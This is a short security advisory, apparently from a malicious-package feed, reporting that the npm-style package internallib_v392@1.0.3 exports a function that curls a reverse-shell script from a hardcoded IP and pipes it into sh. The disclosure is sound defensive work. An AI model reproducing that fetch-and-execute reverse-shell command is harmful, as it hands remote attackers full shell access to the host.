summary: Package exports a reverse-shell dropper to hardcoded attacker IP
details: internallib_v392@1.0.3 ships an index.js whose exported command() invokes /bin/bash -c to curl https://reverse-shell.sh/10.0.72.234:443 and pipe the result into sh. Invoking the exported function fetches and executes an unpinned remote script that opens an interactive shell callback to 10.0.72.234:443, giving the operator of that endpoint full shell access on the host running the code. The destination IP and port are hardcoded, the fetch is unverified, and the behavior mismatches any legitimate library purpose.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
